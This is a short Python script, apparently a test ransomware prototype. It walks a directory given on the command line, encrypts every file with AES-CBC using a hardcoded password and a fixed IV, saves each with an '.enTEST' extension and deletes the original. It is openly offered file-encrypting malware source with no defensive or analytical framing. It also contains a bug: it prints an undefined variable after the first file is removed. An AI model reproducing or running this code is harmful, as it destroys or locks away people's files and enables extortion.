import sys
import os
import struct, hashlib, time
import binascii
from Crypto.Cipher import AES

def encrypt_file(key, in_filename, out_filename=None, chunksize=65536):
    if not out_filename:

        #Add custom extensions
        out_filename = in_filename + '.enTEST'

    #Add custom initialvector
    iv = 'initialvector123'

    encryptor = AES.new(key, AES.MODE_CBC, iv)

    #Get File Size
    filesize = os.path.getsize(in_filename)

    #Open Input-File read & binary mode
    with open(in_filename, 'rb') as infile:

        #Open Output-File write & binary mode
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))

def make_pass():
    timekey = int(time.time())
    return str(timekey)

def main():
    # Get PATH
    PATH = sys.argv[1]
    
    file_list = []

    #password = make_pass()

    #Make custom Password
    password = "sdagdafdsafds"

    #Make Key With SHA256
    key = hashlib.sha256(password).digest()

    #After receiving a list of files in a DIR, save them in an array(file_list).
    for filename in os.listdir(PATH):
        fullname = os.path.join(PATH,filename)
        if os.path.isfile(fullname):
            file_list.append(fullname)

    #Get extension of files    
    for i in range(len(file_list)):
            in_file = file_list[i]  
            extension = os.path.splitext(in_file)[1]

            if extension == '.enTEST':
                pass
            else:
                encrypt_file(key, in_filename=in_file, out_filename=None)
                os.remove(in_file)
                print(in_filename+" Encrypted!!")

if  __name__ == '__main__':
   main()
